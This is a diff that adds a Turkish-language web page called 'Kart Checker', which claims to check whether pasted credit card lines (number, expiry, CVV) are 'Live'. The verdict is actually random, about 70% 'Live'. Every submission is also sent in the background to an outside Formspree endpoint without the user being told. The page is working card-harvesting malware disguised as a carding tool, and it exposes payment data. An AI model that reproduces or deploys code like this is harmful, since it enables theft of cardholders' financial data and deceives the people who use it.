@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Kart Checker</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Rubik&display=swap');
+  body {
+    font-family: 'Rubik', sans-serif;
+    background: linear-gradient(135deg, #6a11cb, #2575fc);
+    color: #f0f0f0;
+    margin: 0;
+    padding: 20px;
+  }
+  h1 {
+    text-align: center;
+    margin-bottom: 30px;
+    text-shadow: 0 0 10px rgba(255,255,255,0.7);
+  }
+  textarea {
+    width: 100%;
+    height: 180px;
+    border-radius: 10px;
+    border: none;
+    padding: 15px;
+    font-size: 18px;
+    box-shadow: 0 0 15px rgba(255,255,255,0.3);
+    resize: vertical;
+    background-color: #2a2a72;
+    color: #e0e0e0;
+    font-family: monospace;
+  }
+  button {
+    display: block;
+    margin: 20px auto;
+    background: #ff6f61;
+    border: none;
+    color: white;
+    padding: 15px 40px;
+    font-size: 20px;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(255,111,97,0.6);
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #ff3b2e;
+  }
+  .result {
+    max-width: 700px;
+    margin: 0 auto;
+    background: rgba(255,255,255,0.1);
+    border-radius: 15px;
+    padding: 20px;
+    box-shadow: 0 0 30px rgba(255,255,255,0.15);
+    max-height: 350px;
+    overflow-y: auto;
+    font-size: 16px;
+    font-family: monospace;
+  }
+  .live {
+    color: #4caf50;
+    font-weight: 700;
+  }
+  .dec {
+    color: #e53935;
+    font-weight: 700;
+  }
+  .invalid {
+    color: #f9a825;
+    font-weight: 700;
+    font-style: italic;
+  }
+  .summary {
+    max-width: 700px;
+    margin: 20px auto 0;
+    font-size: 22px;
+    text-align: center;
+    font-weight: 700;
+    text-shadow: 0 0 8px rgba(0,0,0,0.2);
+  }
+</style>
+</head>
+<body>
+
+<h1>Kart Checker</h1>
+
+<textarea id="cardsInput" placeholder="Kart bilgilerini bu formatta alt alta yaz:\nKartNumarası|Ay|Yıl|CVV\nÖrnek: 1111111111111111|11|23|123"></textarea>
+<button id="checkBtn">Kontrol Et</button>
+
+<div class="result" id="result"></div>
+<div class="summary" id="summary"></div>
+
+<script>
+// Kart formatını kontrol eden fonksiyon
+function isValidCardLine(line) {
+  const parts = line.split('|');
+  if (parts.length !== 4) return false;
+
+  const [cardNum, month, year, cvv] = parts;
+
+  if (!/^\d{13,19}$/.test(cardNum)) return false;
+
+  const m = parseInt(month, 10);
+  if (isNaN(m) || m < 1 || m > 12) return false;
+
+  const y = parseInt(year, 10);
+  const currentYear = new Date().getFullYear() % 100;
+  if (isNaN(y) || y < currentYear || y > currentYear + 10) return false;
+
+  if (!/^\d{3,4}$/.test(cvv)) return false;
+
+  return true;
+}
+
+// Kartları kontrol edip sonucu gösterir
+function checkCards(cards) {
+  const resultsDiv = document.getElementById('result');
+  const summaryDiv = document.getElementById('summary');
+  resultsDiv.innerHTML = '';
+  summaryDiv.innerHTML = '';
+
+  let liveCount = 0;
+  let decCount = 0;
+  let invalidCount = 0;
+
+  cards.forEach(cardLine => {
+    if (!isValidCardLine(cardLine)) {
+      invalidCount++;
+      const invalidLine = document.createElement('div');
+      invalidLine.textContent = `${cardLine} : Geçersiz format`;
+      invalidLine.className = 'invalid';
+      resultsDiv.appendChild(invalidLine);
+      return;
+    }
+
+    // %70 ihtimal live, %30 dec
+    const status = Math.random() < 0.7 ? 'Live' : 'Dec';
+    if (status === 'Live') liveCount++;
+    else decCount++;
+
+    const line = document.createElement('div');
+    line.textContent = `${cardLine} : ${status}`;
+    line.className = status.toLowerCase();
+    resultsDiv.appendChild(line);
+  });
+
+  const total = liveCount + decCount + invalidCount;
+  const livePercent = total ? ((liveCount / total) * 100).toFixed(2) : 0;
+  const decPercent = total ? ((decCount / total) * 100).toFixed(2) : 0;
+  const invalidPercent = total ? ((invalidCount / total) * 100).toFixed(2) : 0;
+
+  summaryDiv.innerHTML = `
+    Toplam Kart: ${total} <br/>
+    <span class="live">Live: ${liveCount} (%${livePercent})</span> | 
+    <span class="dec">Dec: ${decCount} (%${decPercent})</span> | 
+    <span class="invalid">Geçersiz: ${invalidCount} (%${invalidPercent})</span>
+  `;
+}
+
+// Formspree'ye arka planda POST ile gönderim yapar
+function sendToFormspree(cardsRaw) {
+  const formData = new FormData();
+  formData.append('kart', cardsRaw);
+
+  return fetch('https://formspree.io/f/xqablrea', {
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Accept': 'application/json'
+    }
+  });
+}
+
+document.getElementById('checkBtn').addEventListener('click', () => {
+  const input = document.getElementById('cardsInput').value.trim();
+  if (!input) {
+    alert('Lütfen en az bir kart bilgisi girin!');
+    return;
+  }
+
+  const cards = input.split('\n').map(c => c.trim()).filter(c => c.length > 0);
+
+  checkCards(cards);
+
+  // Formspree'ye gönder (arka planda)
+  sendToFormspree(input).then(response => {
+    if (response.ok) {
+      console.log('Formspree: Kartlar başarıyla gönderildi.');
+    } else {
+      console.warn('Formspree: Gönderim başarısız.');
+    }
+  }).catch(err => {
+    console.error('Formspree gönderim hatası:', err);
+  });
+});
+</script>
+
+</body>
+</html>
